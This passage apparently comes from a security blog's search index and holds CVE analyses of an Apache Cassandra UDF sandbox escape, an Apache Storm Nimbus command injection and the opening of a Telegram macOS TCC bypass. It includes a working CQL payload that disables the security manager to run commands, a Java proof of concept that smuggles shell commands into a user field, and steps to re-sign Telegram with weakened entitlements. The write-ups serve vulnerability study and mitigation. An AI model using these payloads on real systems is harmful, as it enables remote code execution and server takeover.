disallowedPatterns array to make sure there is no manipulation in the resource is being used for a bypass. Finally, If the the resource patterns is disallowed it will return false with a massage indicating access denial for the resource, If not, then it will return true indicating that the resource is considered secure.          In the above lines in the screenshot, It’s creating a new ClassLoader Object named udfClassLoader and initializes it with a new instance of the UDFClassLoader class, After that it invokes a constructor named UDFunction which create and initialize a UDF, The function takes the following parameters:           name: A FunctionName object representing the name of the UDF.            argNames: A list of ColumnIdentifier objects representing the names of the function arguments.            argTypes: A list of AbstractType objects representing the types of the function arguments.            returnType: An AbstractType object representing the return type of the function.            alledOnNullInput: A boolean indicating whether the function is called on null input.            language: A string representing the language of the UDF, Wethier is Java or JavaScritp.            body: A string representing the body of the UDF.       Then, it passes the provided parameters to the other constructor and the UDHelper.driverType method is called with the returnType parameter to convert the return type into the corresponding driver type using another helper method.      In the next lines, Here we can see it invokes a second constructor with the same parameters. After that it invokes the constructor of the superclass AbstractFunction with name, argTypes, and returnType parameters, Then performs an assertion check to ensure that the argNames list does not contain any duplicate entries. After That, assigning the variables to instance variables of the class. Finally, It retrieves the metadata for the keyspace specified in the name parameter using the getKeyspaceMetadata method of the Schema.instance object and creates a new instance of the UDFContextImpl class &amp; pass the argNames, argCodecs, returnCodec, and keyspaceMetadata parameters and The results object is assigned to the udfContext instance variable.          Now, We arrived to the funny part in the code where it try to create the UDF. The tryCreate method will take the parameters we mentioned before and try to to create the UDF by passing it to create() function. If we scroll down to take a look at the function we can see it as the following:          The function has a switch statment to check the language of the UDF, If it’s Java, Then it will create the UDF using the JavaBasedUDFunction() function which can be found as src/java/org/apache/cassandra/cql3/functions/JavaBasedUDFunction.java class which represent the UDF implemention in Java,If not then it will create it using ScriptBasedUDFunction() function which can be found as src/java/org/apache/cassandra/cql3/functions/ScriptBasedUDFunction.java class which represent the UDF implemention in scripting languages as JavaScript. If we go to the ScriptBasedUDFunction.java class we will be able to see the Nashron sandbox implemention, Let’s discover the class to make everything more clear.          The class starts with the declaration of two variables protectionDomain and accessControlContext, ProtectionDomain holds information about the protection domain of the class and AccessControlContext represents the access control context for the class.          Here it defines the allowedPackagesArray variable which is an array of strings representing the allowed packages for the Nashorn script engine. These allowed packages determine which packages and classes are accessible within the sandboxed environment for executing the UDFs and this inclusion of specific packages ensures that necessary classes and functionalities required by the scripts and the environment are accessible while maintaining security and preventing unauthorized access to sensitive classes or resources.          When we scroll down we can notice The UDFExecutorService which is a custom executor service used for executing the UDFs and It takes parameters such as a named thread factory, a class loader udfClassLoader, a security thread group &amp; a thread initialization function UDFunction::initializeThread . After that out of the executor we can notice the NashornScriptEngine declering and ClassFilter which is an interface used by the Nashorn script engine.          As we move to the next lines we can see a static block where the nashorn get initialized. First, It creates an instance of ScriptEngineManager and named as scriptEngineManager. Then, It retrieves Nashorn script engine into engine variable which is a ScriptEngine object. After that it checks if the engine variable is not null, If it’s not null it casts the factory of the script engine to NashornScriptEngineFactory, if it’s null it assigns null to the factory variable. Followed by checking if the factory is not null. If it’s not null it will create a new Nashorn script engine using the factory getScriptEngine method and pass empty string array, udfClassLoader as the class loader &amp; the classFilter as the class filter which defined in the above lines wie discuss before. The AccessControlContext encapsulates the context in which a set of permissions is checked for access control decisions.          Here a constructor initializes a ScriptBasedUDFunction instance by compiling the script, performing necessary checks &amp; security measures and setting up the execution context. First it checks if the language specified is JavaScript and if the scriptEngine is not null, If the language is invalid or the scriptEngine is null it throws an InvalidRequestException with an appropriate error message. Then, it attempts to compile the body of the script using the scriptEngineand compilation is executed with no permissions to prevent potentially malicious code from running, such as code in static code blocks or during class initialization &amp; it’s done by using AccessController.doPrivileged() with a PrivilegedExceptionAction that compiles the script. Finally, accessControlContext is used as the access control context for this privileged action If an exception occurs during the compilation process an InvalidRequestException is thrown with a formatted error message. After that an instance of UDFContextWrapper is created and assigned to the udfContextBinding variable and it serves as a binding for the script execution context.          In this code section it first returns the executor instance which is an ExecutorService used for executing tasks asynchronously in the codebase. Then, we have executeUserDefined() function prepares the parameters &amp; execute the UDF script and converts the result into a ByteBuffer to be returned.          Then executeAggregateUserDefined() function prepares the parameters &amp; call the executeScriptInternal() method with the prepared parametersand return the result of executing the UDFaggregate function.   enable_user_defined_functions_threads   The enable_user_defined_functions_threads is a configuration option and when it’s enabled, UDF execution is offloaded to a dedicated thread pool which allowing UDFs to be executed concurrently with other queries. And the main problem is here cause when this option is disabled the UDF runs in the daemon thread, As a results we has permissions to call setSecurityManager which allow us to disable the security manager in cassandra, As a results we will be able to bypass the class filtering and we will be able to include critical or blacklisted calsses to execute codes on the system as when we running the JS code in Nashron we can access Nashorn instance engine, through the access we have to the engine property. We can find the implementation of SecurityManager at the following class src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java the class is providing a mechanism for controlling and enforcing security permissions in Cassandra which allowing fine-grained access control for different operations and resources.   Exploitation   It’s the time to see how we can exploit the vulnerability before do our dynamic analysis on it. So, we be able to understand what we are debugging or analysis dynamically.   CREATE KEYSPACE test WITH replication = {'class': 'SimpleStrategy', 'replication_factor' : 3}; use test; CREATE TABLE tab (cmd text PRIMARY KEY) WITH comment='Important biological records'; create or replace function test.exec(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$ var System = Java.type(\"java.lang.System\");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/Pwn3d.txt\")');name $$; insert into tab(cmd) values('test'); select exec(cmd) from tab;   This UDF will run in a daemon thread as the enable_user_defined_functions_threads option is disabled, As a results we can have permissions to control setSecurityManager and we can see in the UDF we set it to null so we can bypass the class filteration &amp; with the access to engine property we create a new engine instance and call eval() function from JS &amp; finally, Our JAVA code in it to execute a command using Runtime from Java. In our case, The code will create a file named Pwn3d.txt under the /tmp directory on the server as a PoC. Let’s Run the UDF and check it out:      Dynamic Analysis   Now, We under stand how is the Nashorn is implemented, How the UDFs get executed the security manager &amp; the class filtering mechanism. It’s time to see the UDFs run in action and in the default settings while we debug it &amp; see the difference dynamically when the security manager is on &amp; When it’s off. We already configured the debugger before when we were setting up our testing lab. Note: For debugging people may face problems when debugging on docker, So we gonna build cassandra easily and debug it locally from the kali machine. First download Cassandra-4.0.0 from here. Now, extract it and install apache ant:   sudo apt install ant   Now, let’s build Cassandra by using ant command:              After building is done, Let’s enable debugging by exporting the following variable in our environmenrt:   export JVM_EXTRA_OPTS=\"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1414\"              Before we run the app let’s edit the options in cassandra.yaml file under the conf directory &amp; add the following options:          Now, Run Cassandra using ./bin/cassandra:              The app is running, go to Run Tab and then click on Edit Configurations:              Then Click on the + add sign and choose Remote JVM Debug:              And Name it as you want &amp; configure the remote debugger, By adding the machine IP, Debugging port which is 1414:              Finally, Let’s Set the breakpoint on the private static final UDFExecutorService executor inside of src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java class.              Now, Let’s click on the debugging button                         Next, execute our UDF again:              As you can see because we set the enable_user_defined_functions_threads otpion to true, The UDF not running in a daemon thread. Therefor, We don’t have the permissions to control setSecurityManager. So, We got this execption massege.              When we go to our debugger here clearly we have the members of ScriptBasedUDFunction which are:   protectionDomain = null accessControlContext = null allowedPackagesArray = {String[34]@7856} [\"\", \"com\", \"edu\", \"java\", \"javax\", +29 more] executor = null classFilter = null scriptEngine = null logger = {Logger@7857} \"Logger[org.apache.cassandra.cql3.functions.UDFunction]\" threadMXBean = {ThreadImpl@7858}  allowedPatterns = {String[21]@7859} [\"com/google/comm...\", \"java/io/IOExcep...\", \"java/io/Seriali...\", \"java/lang/\", \"java/math/\", +16 more] disallowedPatterns = {String[34]@7860} [\"com/datastax/dr...\", \"com/datastax/dr...\", \"com/datastax/dr...\", \"com/datastax/dr...\", \"com/datastax/dr...\", +29 more] udfClassLoader = {UDFunction$UDFClassLoader@7861}  $assertionsDisabled = false NAME_COMPARATOR = {SchemaElement$lambda@7862}               Here we can see it executed the ScriptBasedUDFunction() function under UDFunction class implementation as the language is JavaScript &amp; We can see that the body is carrying our function:   body= var System = Java.type(\"java.lang.System\");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/Pwn3d.txt\")');name               After that it starts to create our UDF using create method. And it’s passing the needed parameters as the following:   this = {CreateFunctionStatement@7887} \"CreateFunctionStatement (test, exec)\"  functionName = \"exec\"  argumentNames = {ArrayList@7880}  size = 1  rawArgumentTypes = {ArrayList@7937}  size = 1  rawReturnType = {CQL3Type$Raw$RawType@7938} \"text\"  calledOnNullInput = false  language = \"javascript\"  body = \"\\nvar System = Java.type(\"java.lang.System\");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch /tmp/Pwn3d.txt\")');name \"  orReplace = true  ifNotExists = false  keyspaceName = \"test\" schema = {Keyspaces@7888} \"[KeyspaceMetadata{name=system_schema, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system_schema.keyspaces, system_schema.tables, system_schema.columns, system_schema.triggers, system_schema.dropped_columns, system_schema.views, system_schema.types, system_schema.functions, system_schema.aggregates, system_schema.indexes], views=[], functions=[], types=[]}, KeyspaceMetadata{name=system, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system.\"IndexInfo\", system.batches, system.paxos, system.local, system.peers_v2, system.peers, system.peer_events_v2, system.peer_events, system.compaction_history, system.sstable_activity, system.size_estimates, system.table_estimates, system.available_ranges_v2, system.available_ranges, system.transferred_ranges_v2, system.transferred_ranges, system.view_bu\"  keyspaces = {RegularImmutableMap@7940}  size = 6  tables = {RegularImmutableMap@7941}  size = 41 keyspace = {KeyspaceMetadata@7889} \"KeyspaceMetadata{name=test, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}, tables=[test.tab], views=[], functions=[], types=[]}\"  name = \"test\"  kind = {KeyspaceMetadata$Kind@7943} \"REGULAR\"  params = {KeyspaceParams@7944} \"KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}\"  tables = {Tables@7945} \"[test.tab]\"  views = {Views@7946} \"[]\"  types = {Types@7947} \"[]\"  functions = {Functions@7948} \"[]\" argumentTypes = {ArrayList@7881}  size = 1  0 = {UTF8Type@7882} \"org.apache.cassandra.db.marshal.UTF8Type\" returnType = {UTF8Type@7882} \"org.apache.cassandra.db.marshal.UTF8Type\"  reverseComparator = {AbstractType$lambda@7922}   comparisonType = {AbstractType$ComparisonType@7923} \"BYTE_ORDER\"  isByteOrderComparable = true  comparatorSet = {ValueComparators@7924}  argumentNames = {ArrayList@7880}  size = 1  0 = {ColumnIdentifier@7919} \"name\" functionName = \"exec\"  value = {char[4]@7935} [e, x, e, c]  hash = 0              Moving forward it will go to the src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java class to start performing the security checks using isSecuredThread() that checks if the current thread is a secured thread. Now, Let’s disable the enable_user_defined_functions_threads and see how the function will get executed while we debugging:              Then restart Cassandra and start to debug, When we start to debug it will do the same previous, But when we arrive here:              it’s checking if the current thread is running in a secured thread group SecurityThreadGroup and returns true if the thread has been previously initialized as secured or false if it’s not running in a secured thread group or has not been initialized yet. But, In our case it will return false.              Here when it’s come to check if the thread results is true, Then it will throw execption tells us that access denied. But, This time will not as the the UDF running as a daemon thread and we set the securityManager to null. As a results it will execute our UDF successfully.   Mitigation   The vulnerability is only avlilable under the configurations we configure Cassandra on, To mitigate this CVE we have to set enable_user_defined_functions_threads option to true to prevent the UDF from running as a daemon thread &amp; If you not using UDFs you better disable it. You can use this remedy script on Vsociety from here to help you with that.       Mitigation Video: https://ibb.co/GpQzPTd   Conclusion   In a short way, We analyzed the vulnerability&amp; the root-cause, The UDFs, Nashron, SecurityManager &amp; more. We saw how UDFs created and executed &amp; How under a certien configurations the Cassandra can be vulnerable for the CVE. Finally, How it could be used to bypass all the security implementations and achieve remote code execution on the target host.   Resources           https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0            https://cassandra.apache.org/doc/latest/cassandra/troubleshooting/use_tools.html            https://murukeshm.github.io/cassandra/3.11.3/development/ide.html            https://ant.apache.org/manual/install.html            https://cassandra.apache.org/_/index.html            https://cassandra.apache.org/_/quickstart.html      ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2021_44521/",
        "teaser": "http://localhost:5000/assets/images/cli5lwxbp2gdc0vmh1sl18yr3.png"
      },{
        "title": "CVE-2021-38294: Apache Storm Nimbus Command Injection",
        "excerpt":"Introduction   #CVE-2021-38294 is a Command Injection vulnerability that affects Nimbus server in apache storm in getTopologyHistory services, A successful crafted request to Nimbus server will result in exploitation for this vulnerability will lead to execute malicious command &amp; takeover the server. The affected versions are 1.x prior to 1.2.4 &amp; 2.x prior to 2.2.1.   What is Apache Storm ?   Apache Storm is a distributed system for processing big data in real-time, Specifically designed to handle large volumes of data in a reliable and scalable manner and It operates as a streaming data framework allowing for high ingestion rates and efficient data processing. While it is stateless, Storm effectively manages distributed environments and cluster states through Apache ZooKeeper. It provides a straightforward approach to performing parallel manipulations on real-time data, enabling a wide range of data processing tasks. Apache Storm is extensively used by a lot of enterprises/organizations such as Twitter for processing tweets and clicks in its Publisher Analytics Products suite, benefiting from deep integration with the Twitter infrastructure.      In Apache Storm spouts and bolts are connected to form a topology, which represents the real-time application logic as a directed graph. Spouts emit data that is processed by bolts, and the output of a bolt can be passed to another bolt. storm keeps the topology running until explicitly stopped. The execution of spouts and bolts in storm is referred to as tasks. Each spout and bolt can have multiple instances running in separate threads. These tasks are distributed across multiple worker nodes, and the worker nodes listen for jobs and manage the execution of tasks. Finally, What we will need to know well are Nimbus known as master node which plays a central role in the storm framework as it is responsible for running the storm topology by analyzes the topology and collects the tasks to be executed, distributing them to an available Supervisor node and Supervisor is the worker node which can have multiple worker processes, It’s job is to delegate the tasks to these worker processes &amp; each worker process can spawn multiple executors based on the required workload and executes the assigned tasks and communication between the Nimbus and Supervisors is facilitated through an internal distributed messaging system ensuring efficient coordination and data exchange within the storm cluster.   Testing Lab   Let’s start to build our testing lab. First, We would need ZooKeeper to be installed you can download it from here. After downloading, extract it and create a directory data within Zookeeper directory:   mkdir data      Next, Copy the sample configuration as a main configuration file for Zookeeper:   cp conf/zoo_sample.cfg conf/zoo.cfg      Open zoo.cfg file and add the data directory file path we created previously:      Now, Start ZooKeeper:   ./bin/zkServer.sh start      The server started and verify it by running the CLI:   ./bin/zkCli.sh      Now, It’s time to install &amp; start Apache Storm, Download it from here. First, Create another folder inside of apache storm directory by the name data:   mkdir data      After that open the configurations file conf/storm.yaml and add the following to the file:   # Storm configuration file  # Nimbus settings nimbus.seeds: [\"localhost\"]  # List of Nimbus hostnames or IP addresses nimbus.host: \"localhost\" # ZooKeeper settings storm.zookeeper.servers:   - \"localhost\"  # Storm UI settings ui.port: 8081    # Supervisor settings supervisor.slots.ports:   - 6700   - 6701   - 6702  # Worker settings worker.childopts: \"-Xmx768m\"  # Topology settings topology.debug: true  # Enable debugging for topologies topology.max.spout.pending: 1000  # Maximum number of pending messages per spout  # Log4j settings worker.log.level: INFO  # Log level for Storm workers   Don’t forget to replace the Zookeper &amp; Nimbus server IP with your IP (The same machine IP). Let’s start it now. Starting Nimbus server:   ./bin/storm nimbus      Starting Supervisor:   ./bin/storm supervisor      Starting Storm UI:   ./bin/storm ui      Visit the UI on port 8081 as we configure:      Patch Diffing   You can download the source code from here, The patch here on github.      It shows us changes made to storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java where the getGroupsCommand() method got deleted which was return a command as a string array to retrieve the groups on the system. Then, the following function modified:   ##### Before public static String[] getGroupsForUserCommand(final String user) {         if (WINDOWS) {             throw new UnsupportedOperationException(\"Getting user groups is not supported on Windows\");         }         //'groups username' command return is non-consistent across different unixes         return new String[]{             \"bash\", \"-c\", \"id -gn \" + user                           + \"&amp;&amp; id -Gn \" + user         };     }      ##### After public static String[] getGroupsForUserCommand(final String user) {         if (WINDOWS) {             throw new UnsupportedOperationException(\"Getting user groups is not supported on Windows\");         }         //'groups username' command return is non-consistent across different unixes         return new String[]{\"id\", \"-Gn\", user};     }   The modification of getGroupsForUserCommand(String user) has been updated to use a more concise command. We can see clearly from the patch diffing that the Command Injection Occures in this part specifically in user parameter that get passed to the getGroupsForUserCommand() and also we can notice the bach -c in the String array, Let’s move to the analysis to understand how this happens.   The Analysis   When we go to the apache-storm-2.2.0/storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java and scroll down after getGroupsForUserCommand() method we can see the following:      This run() method is declared as protected which means it can only be accessed within the same package or by sub-classes and it implements a control flow that determines whether a specified interval has passed since the last execution, If the interval has passed it will reset the exitCode and proceeds to execute the runCommand() method. Now, By scrolling down:      We will be able to see the runCommand() method and It’s a long method, So let’s break it down and explain it:   ProcessBuilder builder = new ProcessBuilder(getExecString()); Timer timeOutTimer = null; ShellTimeoutTimerTask timeoutTimerTask = null; timedOut = new AtomicBoolean(false); completed = new AtomicBoolean(false);   First, It creates a new ProcessBuilder object with the executable command obtained from the getExecString() method:      Here is the getExecString() method which returns the command value. Then, it declares two variables of type Timer and ShellTimeoutTimerTask as null which will be used to handle timeouts for the command execution. Finally, Creates two AtomicBoolean variables named timedOut and completed &amp; initializes them with the value false which used to track the status of the command execution.   if (environment != null) {     builder.environment().putAll(this.environment); } if (dir != null) {     builder.directory(this.dir); }  builder.redirectErrorStream(redirectErrorStream); process = builder.start();   The first if condition checks if the environment variable is not null and If it’s not null, it retrieves the environment variables associated with the ProcessBuilder instance using builder.environment() and adds all the key value pairs from the this.environment map. The second if condition checks if the dir variable is not null and If it’s not null, it sets the working directory of the process to the specified directory t his.dir using builder.directory(this.dir). Finally, it’s configuring the ProcessBuilder to redirect the error stream of the process to the same output stream If redirectErrorStream is set to true the error stream will be merged with the standard output stream and then starts the process using the configured ProcessBuilder by calling the start() method.   if (timeOutInterval &gt; 0) {     timeOutTimer = new Timer(\"Shell command timeout\");     timeoutTimerTask = new ShellTimeoutTimerTask(this);     //One time scheduling.     timeOutTimer.schedule(timeoutTimerTask, timeOutInterval); } final BufferedReader errReader =     new BufferedReader(new InputStreamReader(process                                                  .getErrorStream())); BufferedReader inReader =     new BufferedReader(new InputStreamReader(process                                                  .getInputStream())); final StringBuffer errMsg = new StringBuffer();  // read error and input streams as this would free up the buffers // free the error stream buffer Thread errThread = new Thread() {   Moving to here this IF condition checks if the timeOutInterval is greater than 0, then set up a timer Shell command timeout task to handle the timeout and schedule the timeoutTimerTask to run after the specified timeOutInterval in milliseconds. After that create 2 BufferedReader objects which are errReader and inReader to read the error and input streams of the process, respectively. The process.getErrorStream() and process.getInputStream() methods return the streams associated with the running process. Next, a StringBuffer object named errMsg to store the error message, a new Thread object named errThread then create an anonymous subclass of Thread with overridden run() method.   @Override public void run() {     try {         String line = errReader.readLine();         while ((line != null) &amp;&amp; !isInterrupted()) {             errMsg.append(line);             errMsg.append(System.getProperty(\"line.separator\"));             line = errReader.readLine();         }     } catch (IOException ioe) {         LOG.warn(\"Error reading the error stream\", ioe);     } } }; try { errThread.start(); } catch (IllegalStateException ise) { //ignore } try { parseExecResult(inReader); // parse the output // clear the input stream buffer String line = inReader.readLine(); while (line != null) {     line = inReader.readLine(); } // wait for the process to finish and check the exit code exitCode = process.waitFor(); // make sure that the error thread exits joinThread(errThread); completed.set(true); //the timeout thread handling //taken care in finally block if (exitCode != 0) {     throw new ExitCodeException(exitCode, errMsg.toString()); } } catch (InterruptedException ie) { throw new IOException(ie.toString()); } finally { if (timeOutTimer != null) {     timeOutTimer.cancel(); } // close the input stream try {     // JDK 7 tries to automatically drain the input streams for us     // when the process exits, but since close is not synchronized,     // it creates a race if we close the stream first and the same     // fd is recycled.  the stream draining thread will attempt to     // drain that fd!!  it may block, OOM, or cause bizarre behavior     // see: https://bugs.openjdk.java.net/browse/JDK-8024521     //      issue is fixed in build 7u60     InputStream stdout = process.getInputStream();     synchronized (stdout) {         inReader.close();     } } catch (IOException ioe) {     LOG.warn(\"Error while closing the input stream\", ioe); } if (!completed.get()) {     errThread.interrupt();     joinThread(errThread); } try {     InputStream stderr = process.getErrorStream();     synchronized (stderr) {         errReader.close();     } } catch (IOException ioe) {     LOG.warn(\"Error while closing the error stream\", ioe); } process.destroy(); lastTime = System.currentTimeMillis(); }   Finally, In a summary defines a thread that reads the error stream and appends its contents to the errMsg StringBuffer and start the thread &amp; then proceeds to parse the output from the input stream using the parseExecResult method. After that, the input stream clear its buffer. Then, wait for the process to finish and retrieves the exit code. Next, It ensure that the error thread has exited by joining it and If the exit code is not zero, it throws an ExitCodeException with the error message. In the finally block, it cancel the timeout timer if it exists, closes the input stream, interrupts the error thread if the command execution is not completed, closes the error stream, destroys the process, and updates the lastTime variable with the current time. So, Now how actually the code can get injected or where is the point that the user give the malicious input ?. Let’s discover it by going through the PoC:   import org.apache.storm.utils.NimbusClient; import java.util.ArrayList; import java.util.HashMap; import java.util.List;  public class ThriftClient {     public static void main(String[] args) throws Exception {         HashMap config = new HashMap();         List&lt;String&gt; seeds = new ArrayList&lt;String&gt;();         seeds.add(\"localhost\");         config.put(\"storm.thrift.transport\", \"org.apache.storm.security.auth.SimpleTransportPlugin\");         config.put(\"storm.thrift.socket.timeout.ms\", 60000);         config.put(\"nimbus.seeds\", seeds);         config.put(\"storm.nimbus.retry.times\", 5);         config.put(\"storm.nimbus.retry.interval.millis\", 2000);         config.put(\"storm.nimbus.retry.intervalceiling.millis\", 60000);         config.put(\"nimbus.thrift.port\", 6627);         config.put(\"nimbus.thrift.max_buffer_size\", 1048576);         config.put(\"nimbus.thrift.threads\", 64);         NimbusClient nimbusClient = new NimbusClient(config, \"localhost\", 6627);          // send attack         nimbusClient.getClient().getTopologyHistory(\"foo;touch /tmp/pwned;id \");     } }   When we take a look here at the PoC we can notice that it’s connecting to Storm cluster by adding the configuration first. Then connect to the cluster at localhost on port 6627 &amp; passing the previous configurations. the call the getTopologyHistory() function from the Storm Client. And here where is the command Injection happens. Let’s take a look at the implementation of Nimbus and the function:      When we go under apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/nimbus/NimbusHeartbeatsPressureTest.java which is responsible for implementation of a Nimbus heartbeats pressure test. It starts with defining the class and other variables for configurations.      After that as we can see it starts to initializing the Config for the heartbeats pressure test. Then by scrolling more down:      We can see clearly in the HeartbeatSendTask that it’s using the defined NimbusClient that named client to create a new client connection &amp; Passed the previous initialized Config with Nimbus Host &amp; Port.      Finally, Here we can see it started to connect to the configured client and call the sendSupervisorWorkerHeartbeats() method which can be called remotely. Now, if we go to the apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/daemon/nimbus/Nimbus.java Class:      Here we can see the method clearly accessible remotely and also if we search for getTopologyHistory() method:      Here we can see the method clearly and it takes the user as an parameter to retrieve the topology history information for a the user. And here where the command get injected, When we back to the first of the analysis at the patch diffing when we return information about user, As the user here can be passed and manupilated by anyone through getTopologyHistory() method. It will result in malicious command Injection.   Exploitation   Here we have 2 ways to exploit CVE-2021-38294 an exploit within Metasploit with metasploit as it’s easy to use and most of us fimalier with it By using the following module:      and the 2nd one is a PoC within github.   Conclusion   Finally, This bug only works on linux as the injectable of the affected component is when getting the information about the user on linux. We saw how this vulnerability happens and the root-cause of the vulnerability &amp; How it can be exploited remotely.   Resources           https://www.cloudduggu.com/storm/installation/            https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz            https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0.zip           #apache #storm #cve #analysis  ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2021_38294/",
        "teaser": "http://localhost:5000/assets/images/clj4188w109xs0umzd5r94z6w.png"
      },{
        "title": "CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection",
        "excerpt":"Introduction   A vulnerability Discovered in Telegram for MacOS assigned as CVE-2023-26818 leads to a TCC (Transparency, Consent, and   Control) bypass through a DyLib Injection using DYLD_INSERT_LIBRARIES environment variable along with bypass   the SandBox using LaunchAgent. A successful exploitation of this vulnerability will lead to a local privilege escalation by   getting access to the camera through previously granted permissions to Telegram.   Essentials  Code Signing   The Code Signing is a security technology used to sign/certify your app unique so the system can verify if any changes made to   the app is by the original owner or by malicious activity. Also, It helps prevent the loading of crafted or malicious   components to your app as these components are not signed by the owner.   Entitlements   Entitlements refers to security permissions that you give to your app either on IOS or MacOS and It’s in a Key-Value form.   For example: com.apple.developer.authentication-services.autofill-credential-provider which is an Entitlement that used to provide   user names and passwords for AutoFill in Safari and other apps &amp; It has a boolen type to define whether the app may do   the AutoFill or no. Another example com.apple.developer.location.push which allows enabling a location-sharing app to query   someone’s location in response to a push notification. And the same applies to others like accessing physical devices such   as Camera.   Hardened Runtime   Hardened Runtime is a MacOS app security protection and resources access used to protect and prevent certain exploits   against your app which is as the following: (code injection, dynamically linked library (DLL) hijacking, and process memory space tampering).   Launch Agent   A Launch Agent is a mechanism used to manage and schedule the execution of background tasks or processes on MacOS &amp; It’s a   part of Launchd which is responsible for starting, stopping, and managing processes at various stages of the system’s startup   and operation. The daemons and agents managed by launchd by looking at the configuration files in the following folders:   Folders/System/Library/LaunchDaemons for Apple-supplied system daemons/System/Library/LaunchAgents for Apple-supplied agents   that apply to all users on a per-user basis/Library/LaunchDaemons for Third-party system daemons/Library/LaunchAgents for Third-   party agents that apply to all users on a per-user basis~/Library/LaunchAgents for Third-party agents that apply only to the   logged-in user   TCC   TCC (Transparency, Consent, and Control) is a security feature in macOS that regulates access to sensitive user data/parts by   applications with managing application access to various protected resources, such as the camera, microphone, contacts,   calendar, location, and more. When an application attempts to access one of these resources, TCC checks if the application has   been granted permission by the user. If permission has not been granted, the application is denied access to the resource.   DyLib/Injection   DyLib is a short for (Dynamic Library) which is a library that is loaded at the runtime &amp; launch time of the software, Unless   Static Libraries, Which are linked to the software as a part of the code during the compilation, and As a result the software size   becomes large &amp; slower in launching time &amp; performance. Because, When the software gets launched with the included static   libraries as a part of the code all get loaded in the same memory space as a one piece. Therefore, It suffers from slow   launch times and large memory footprints. For the DyLib, It improves the performance and flexibility by not becoming a part   of the code &amp; It gets loaded when it’s required or during the runtime launching time. As a result, a small size and small   memory footprints for the software. The following diagrams show the difference between Static Libraries and DyLib:           Static Libraries:                   Dynamic Libraries:              Testing Lab   For Our Lab, we need MacOS any supported version by the Telegram and for the vulnerable versions according to   the CVE description is 9.3.1 and 9.4.0. But, Telegram team deleted those versions. So we gonna download this   one 9.3.2 from here and we will do some modifications to make it vulnerable again. After Downloading it, Move it to   the Applications Directory. Now, We will remove the signing from telegram and re-sign it with our signature and Entitlements.   Let’s first take a look on the signing information and the Entitlements related to Telegram app:   codesign -dv --entitlements :- /Applications/Telegram.app      To remove telegram signing we need to execute the following command to Telegram App:   codesign --remove-signature --no-strict /Applications/Telegram.app   Now, The command is run successfully, and if we check the signing with codesign command. We can see it has no signing:   codesign -dv --etitlements :- /Applications/Telegram.app      Let’s sign Telegram App now with our own signature and Entitlements, First, we need to get our own signature, You can get it   by doing the following… First, Download Xcode from AppStore on your MacOS:      After that open Xcode and create a new project then go to Xcode in the menu and then Settings:      Then go to accounts and click on + and add your Apple ID:      After adding your Apple ID, Click on Manage Certificates and click on + and add a new signing certificate:      After finishing we need to build the test app to get our signature So, we need to configure the signing. Click on our project   on the left side, The go to Signing &amp; Capabilities tab and choose your ID:      Finally, Click on the play button to build and run the app:      Now, It’s time top get our signature by executing the following command:   security find-identity -v -p codesigning      I had created 2 before so you can see them clearly, Now it’s time to create our Entitlements that we gonna sign with telegram:   &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;dict&gt;     &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;     &lt;false/&gt;     &lt;key&gt;com.apple.security.application-groups&lt;/key&gt;     &lt;array&gt;         &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram&lt;/string&gt;         &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&lt;/string&gt;     &lt;/array&gt;     &lt;key&gt;com.apple.security.cs.allow-dyld-environment-variables&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.personal-information.location&lt;/key&gt;     &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt;   Now save all these Entitlements into a file let’s name it entit.plist. It’s time to take your valid development signature and   let’s start signing Telegram App:   codesign --force --deep --sign \"Developer ID\" --entitlements entit.plist /Applications/Telegram.app      Now, We have the app signed by us and it’s ready for analysis.   The Analysis   Let’s start our analysis by taking a look at the signing information we did which simulates the actual one for the version   that got deleted by the team.   codesign -dv --entitlements :- /Applications/Telegram.app      This command is to show the signing info of the app, Along with Entitlements. The -dv is to display information about code   signing and verbosing. for --entitlements :- is to display the app Entitlements. When we take a closer look we can see the   highlighted places which are flags=0x0(none) the following:   &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;&lt;true/&gt;   So, What is this key, and what it’s doing? the 